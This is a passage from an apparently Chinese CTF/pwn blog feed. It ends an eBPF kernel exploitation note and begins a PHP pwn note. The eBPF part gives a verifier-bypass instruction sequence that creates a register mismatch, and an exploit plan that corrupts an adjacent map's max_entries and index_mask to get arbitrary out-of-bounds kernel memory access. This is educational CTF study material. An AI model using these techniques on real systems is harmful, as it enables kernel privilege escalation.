BPF_ARSH:&#xD;&#xA;-&#x9;&#x9;return (src_is_const &amp;amp;&amp;amp; src_reg-&amp;gt;umax_value &amp;lt; insn_bitness);&#xD;&#xA;&amp;#43;&#x9;&#x9;return (src_reg-&amp;gt;umax_value &amp;lt; insn_bitness);&#xD;&#xA; &#x9;default:&#xD;&#xA; &#x9;&#x9;return false;&#xD;&#xA; &#x9;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;构造verifier和runtime不一致的寄存器&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),&#xD;&#xA;        BPF_LDX_MEM(BPF_W, BPF_REG_8, BPF_REG_7, 0),&#xD;&#xA;        BPF_ALU64_IMM(BPF_AND, BPF_REG_8, 1),&#xD;&#xA;        BPF_MOV64_IMM(BPF_REG_0, 1),&#xD;&#xA;        BPF_ALU64_REG(BPF_ARSH, BPF_REG_0, BPF_REG_8), // the bug verifier thinks REG_0 is 1 while is 0&#xD;&#xA;        BPF_MOV64_IMM(BPF_REG_9, 1),&#xD;&#xA;        BPF_ALU64_REG(BPF_SUB, BPF_REG_9, BPF_REG_0), // verifier thinks REG_9 is 0 while is 1&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里把一个&lt;code&gt;map&lt;/code&gt;的值设置为1，然后&lt;code&gt;look_up_elem&lt;/code&gt;。接下来，进入上面的代码。&lt;/p&gt;&#xA;&lt;p&gt;把&lt;code&gt;runtime&lt;/code&gt;为1的值读入reg8，&lt;code&gt;and&lt;/code&gt;运算后&lt;code&gt;verifier&lt;/code&gt;认为它是[0,1]&lt;/p&gt;&#xA;&lt;p&gt;接着进行&lt;code&gt;1 arsh reg8&lt;/code&gt;，由于&lt;code&gt;arsh&lt;/code&gt;运算取的是&lt;code&gt;umin_val&lt;/code&gt;，所以&lt;code&gt;verifier&lt;/code&gt;认为它是1，实际上它是0&lt;/p&gt;&#xA;&lt;p&gt;不管是对&lt;code&gt;ALU32&lt;/code&gt;还是&lt;code&gt;ALU64&lt;/code&gt;，进行&lt;code&gt;arsh&lt;/code&gt;运算的时候，都是去&lt;code&gt;src_reg&lt;/code&gt;的&lt;code&gt;umin&lt;/code&gt;进行操作&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;static void scalar32_min_max_arsh(struct bpf_reg_state *dst_reg,&#xD;&#xA;&#x9;&#x9;&#x9;&#x9;  struct bpf_reg_state *src_reg)&#xD;&#xA;{&#xD;&#xA;&#x9;u64 umin_val = src_reg-&amp;gt;u32_min_value;&#xD;&#xA;&#xD;&#xA;&#x9;/* Upon reaching here, src_known is true and&#xD;&#xA;&#x9; * umax_val is equal to umin_val.&#xD;&#xA;&#x9; */&#xD;&#xA;&#x9;dst_reg-&amp;gt;s32_min_value = (u32)(((s32)dst_reg-&amp;gt;s32_min_value) &amp;gt;&amp;gt; umin_val);&#xD;&#xA;&#x9;dst_reg-&amp;gt;s32_max_value = (u32)(((s32)dst_reg-&amp;gt;s32_max_value) &amp;gt;&amp;gt; umin_val);&#xD;&#xA;&#xD;&#xA;&#x9;dst_reg-&amp;gt;var_off = tnum_arshift(tnum_subreg(dst_reg-&amp;gt;var_off), umin_val, 32);&#xD;&#xA;&#xD;&#xA;&#x9;/* blow away the dst_reg umin_value/umax_value and rely on&#xD;&#xA;&#x9; * dst_reg var_off to refine the result.&#xD;&#xA;&#x9; */&#xD;&#xA;&#x9;dst_reg-&amp;gt;u32_min_value = 0;&#xD;&#xA;&#x9;dst_reg-&amp;gt;u32_max_value = U32_MAX;&#xD;&#xA;&#xD;&#xA;&#x9;__mark_reg64_unbounded(dst_reg);&#xD;&#xA;&#x9;__update_reg32_bounds(dst_reg);&#xD;&#xA;}&#xD;&#xA;static void scalar_min_max_arsh(struct bpf_reg_state *dst_reg,&#xD;&#xA;&#x9;&#x9;&#x9;&#x9;struct bpf_reg_state *src_reg)&#xD;&#xA;{&#xD;&#xA;&#x9;u64 umin_val = src_reg-&amp;gt;umin_value;&#xD;&#xA;&#xD;&#xA;&#x9;/* Upon reaching here, src_known is true and umax_val is equal&#xD;&#xA;&#x9; * to umin_val.&#xD;&#xA;&#x9; */&#xD;&#xA;&#x9;dst_reg-&amp;gt;smin_value &amp;gt;&amp;gt;= umin_val;&#xD;&#xA;&#x9;dst_reg-&amp;gt;smax_value &amp;gt;&amp;gt;= umin_val;&#xD;&#xA;&#xD;&#xA;&#x9;dst_reg-&amp;gt;var_off = tnum_arshift(dst_reg-&amp;gt;var_off, umin_val, 64);&#xD;&#xA;&#xD;&#xA;&#x9;/* blow away the dst_reg umin_value/umax_value and rely on&#xD;&#xA;&#x9; * dst_reg var_off to refine the result.&#xD;&#xA;&#x9; */&#xD;&#xA;&#x9;dst_reg-&amp;gt;umin_value = 0;&#xD;&#xA;&#x9;dst_reg-&amp;gt;umax_value = U64_MAX;&#xD;&#xA;&#xD;&#xA;&#x9;/* Its not easy to operate on alu32 bounds here because it depends&#xD;&#xA;&#x9; * on bits being shifted in from upper 32-bits. Take easy way out&#xD;&#xA;&#x9; * and mark unbounded so we can recalculate later from tnum.&#xD;&#xA;&#x9; */&#xD;&#xA;&#x9;__mark_reg32_unbounded(dst_reg);&#xD;&#xA;&#x9;__update_reg_bounds(dst_reg);&#xD;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h5 class=&#34;heading-element&#34; id=&#34;源码-1&#34;&gt;&lt;span&gt;源码&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e6%ba%90%e7%a0%81-1&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h5&gt;&lt;pre&gt;&lt;code&gt;struct bpf_map {&#xD;&#xA;&#x9;const struct bpf_map_ops *ops;&#xD;&#xA;&#x9;struct bpf_map *inner_map_meta;&#xD;&#xA;#ifdef CONFIG_SECURITY&#xD;&#xA;&#x9;void *security;&#xD;&#xA;#endif&#xD;&#xA;&#x9;enum bpf_map_type map_type;&#xD;&#xA;&#x9;u32 key_size;&#xD;&#xA;&#x9;u32 value_size;&#xD;&#xA;&#x9;u32 max_entries;&#xD;&#xA;&#x9;u64 map_extra; /* any per-map-type extra fields */&#xD;&#xA;&#x9;u32 map_flags;&#xD;&#xA;&#x9;u32 id;&#xD;&#xA;&#x9;struct btf_record *record;&#xD;&#xA;&#x9;int numa_node;&#xD;&#xA;&#x9;u32 btf_key_type_id;&#xD;&#xA;&#x9;u32 btf_value_type_id;&#xD;&#xA;&#x9;u32 btf_vmlinux_value_type_id;&#xD;&#xA;&#x9;struct btf *btf;&#xD;&#xA;#ifdef CONFIG_MEMCG&#xD;&#xA;&#x9;struct obj_cgroup *objcg;&#xD;&#xA;#endif&#xD;&#xA;&#x9;char name[BPF_OBJ_NAME_LEN];&#xD;&#xA;&#x9;struct mutex freeze_mutex;&#xD;&#xA;&#x9;atomic64_t refcnt;&#xD;&#xA;&#x9;atomic64_t usercnt;&#xD;&#xA;&#x9;/* rcu is used before freeing and work is only used during freeing */&#xD;&#xA;&#x9;union {&#xD;&#xA;&#x9;&#x9;struct work_struct work;&#xD;&#xA;&#x9;&#x9;struct rcu_head rcu;&#xD;&#xA;&#x9;};&#xD;&#xA;&#x9;atomic64_t writecnt;&#xD;&#xA;&#x9;/* &amp;#39;Ownership&amp;#39; of program-containing map is claimed by the first program&#xD;&#xA;&#x9; * that is going to use this map or by the first program which FD is&#xD;&#xA;&#x9; * stored in the map to make sure that all callers and callees have the&#xD;&#xA;&#x9; * same prog type, JITed flag and xdp_has_frags flag.&#xD;&#xA;&#x9; */&#xD;&#xA;&#x9;struct {&#xD;&#xA;&#x9;&#x9;const struct btf_type *attach_func_proto;&#xD;&#xA;&#x9;&#x9;spinlock_t lock;&#xD;&#xA;&#x9;&#x9;enum bpf_prog_type type;&#xD;&#xA;&#x9;&#x9;bool jited;&#xD;&#xA;&#x9;&#x9;bool xdp_has_frags;&#xD;&#xA;&#x9;} owner;&#xD;&#xA;&#x9;bool bypass_spec_v1;&#xD;&#xA;&#x9;bool frozen; /* write-once; write-protected by freeze_mutex */&#xD;&#xA;&#x9;bool free_after_mult_rcu_gp;&#xD;&#xA;&#x9;bool free_after_rcu_gp;&#xD;&#xA;&#x9;atomic64_t sleepable_refcnt;&#xD;&#xA;&#x9;s64 __percpu *elem_count;&#xD;&#xA;};&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;struct bpf_array {&#xD;&#xA;&#x9;struct bpf_map map;&#xD;&#xA;&#x9;u32 elem_size;&#xD;&#xA;&#x9;u32 index_mask;&#xD;&#xA;&#x9;struct bpf_array_aux *aux;&#xD;&#xA;&#x9;union {&#xD;&#xA;&#x9;&#x9;DECLARE_FLEX_ARRAY(char, value) __aligned(8);&#xD;&#xA;&#x9;&#x9;DECLARE_FLEX_ARRAY(void *, ptrs) __aligned(8);&#xD;&#xA;&#x9;&#x9;DECLARE_FLEX_ARRAY(void __percpu *, pptrs) __aligned(8);&#xD;&#xA;&#x9;};&#xD;&#xA;};&lt;/code&gt;&lt;/pre&gt;&lt;h5 class=&#34;heading-element&#34; id=&#34;利用思路&#34;&gt;&lt;span&gt;利用思路&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%88%a9%e7%94%a8%e6%80%9d%e8%b7%af&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h5&gt;&lt;p&gt;由于三个&lt;code&gt;map&lt;/code&gt;在内存上是连在一起的，每个&lt;code&gt;map&lt;/code&gt;加上&lt;code&gt;0x400&lt;/code&gt;就是下一个&lt;code&gt;map&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;利用&lt;code&gt;verifier&lt;/code&gt;和运行时不一致的寄存器，越界读写下一个&lt;code&gt;map&lt;/code&gt;（&lt;code&gt;victim map&lt;/code&gt;）的&lt;code&gt;max_entries&lt;/code&gt;和&lt;code&gt;index_mask&lt;/code&gt;，都设置为&lt;code&gt;0xffffffff&lt;/code&gt;，这样就能越界读写这个&lt;code&gt;map&lt;/code&gt;接下来的很大一部分内存&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;修改&lt;code&gt;index_map&lt;/code&gt;是因为，某些路径中有：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;index &amp;amp;= array-&amp;gt;index_mask;&lt;/code&gt;&lt;/pre&gt;&lt;/blockquote&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;downunderctf-2025_rolling-around&#34;&gt;&lt;span&gt;DownUnderCTF 2025_Rolling Around&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#downunderctf-2025_rolling-around&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;p&gt;&lt;a href=&#34;https://9anux.org/2025/07/24/ebpf/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://9anux.org/2025/07/24/ebpf/&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;阿里云ctf-2025-beebee&#34;&gt;&lt;span&gt;阿里云CTF 2025 beebee&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e9%98%bf%e9%87%8c%e4%ba%91ctf-2025-beebee&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;p&gt;&lt;a href=&#34;https://blog.xmcve.com/2025/02/25/%E9%98%BF%E9%87%8C%E4%BA%91CTF2025-Writeup/#title-6&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://blog.xmcve.com/2025/02/25/%E9%98%BF%E9%87%8C%E4%BA%91CTF2025-Writeup/#title-6&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://bbs.kanxue.com/thread-285786-1.htm&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://bbs.kanxue.com/thread-285786-1.htm&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://xz.aliyun.com/news/17029?amp;u_atoken=27649aed9882a7bda204f993c159b1a6&amp;amp;amp;u_asig=54d85&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://xz.aliyun.com/news/17029?amp;u_atoken=27649aed9882a7bda204f993c159b1a6&amp;amp;u_asig=54d85&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;ref&#34;&gt;&lt;span&gt;ref&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#ref&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://www.anquanke.com/post/id/263803&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;BPF之路一bpf系统调用&lt;/a&gt;，主要涉及&lt;code&gt;ebpf&lt;/code&gt;的&lt;code&gt;JIT&lt;/code&gt;部分&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://niebelungen-d.github.io/seccon2021-kone-gadget/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SECCON2021-kone_gadget WP&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://bbs.kanxue.com/thread-267956-1.htm&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Linux内核eBPF虚拟机源码分析——verifier与jit &lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://9anux.org/2025/07/24/ebpf/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Jailbreaking eBPF&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://bbs.kanxue.com/thread-266200.htm&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Linux内核PWN [BPF模块整数溢出] 漏洞分析&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://arttnba3.cn/tags/eBPF/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;a3 &lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://bbs.kanxue.com/thread-267956-1.htm&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Linux内核eBPF虚拟机源码分析——verifier与jit&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://docs.ebpf.io/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;ebpf docs&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/iovisor/bpf-docs/blob/master/eBPF.md&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://github.com/iovisor/bpf-docs/blob/master/eBPF.md&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://stdnoerr.blog/blog/eBPF-exploitation-D3CTF-d3bpf&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://stdnoerr.blog/blog/eBPF-exploitation-D3CTF-d3bpf&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://196082.github.io/2023/01/06/d3bpf/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://196082.github.io/2023/01/06/d3bpf/&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Phppwn笔记</title>
      <link>http://localhost:1313/posts/phppwn_note/</link>
      <pubDate>Mon, 02 Feb 2026 11:41:59 +0800</pubDate>
      <guid>http://localhost:1313/posts/phppwn_note/</guid>
      <category domain="http://localhost:1313/categories/pwn/">Pwn</category>
      <description>&lt;h2 class=&#34;heading-element&#34; id=&#34;参考文章&#34;&gt;&lt;span&gt;参考文章&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%8f%82%e8%80%83%e6%96%87%e7%ab%a0&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;有些前置的东西可以看这些文章&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://bbs.kanxue.com/thread-286446.htm&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://bbs.kanxue.com/thread-286446.htm&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://www.anquanke.com/post/id/204404&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://www.anquanke.com/post/id/204404&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://imlzh1.github.io/posts/PHP-So-Pwn/#zend_parse_parameters&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://imlzh1.github.io/posts/PHP-So-Pwn/#zend_parse_parameters&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://www.bookstack.cn/read/php7-internal/7-implement.md&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://www.bookstack.cn/read/php7-internal/7-implement.md&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://xuanxuanblingbling.github.io/ctf/pwn/2020/05/05/mixture/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://xuanxuanblingbling.github.io/ctf/pwn/2020/05/05/mixture/&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;‍&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;笔记&#34;&gt;&lt;span&gt;笔记&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e7%ac%94%e8%ae%b0&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;常用&#34;&gt;&lt;span&gt;常用&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%b8%b8%e7%94%a8&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;搭建镜像的时候，要下载&lt;code&gt;gdbserver&lt;/code&gt;和&lt;code&gt;vim&lt;/code&gt;，方便后面做题&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;RUN apt-get install -y gdbserver vim&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;查看配置和扩展：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;php -i | grep -E &amp;#34;disable_functions|disable_classes|extension = |Loaded Configuration File|extension_dir&amp;#34;&#xD;&#xA;php -m | grep hackphp&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;emalloc_playground&#34;&gt;&lt;span&gt;emalloc_playground&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#emalloc_playground&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  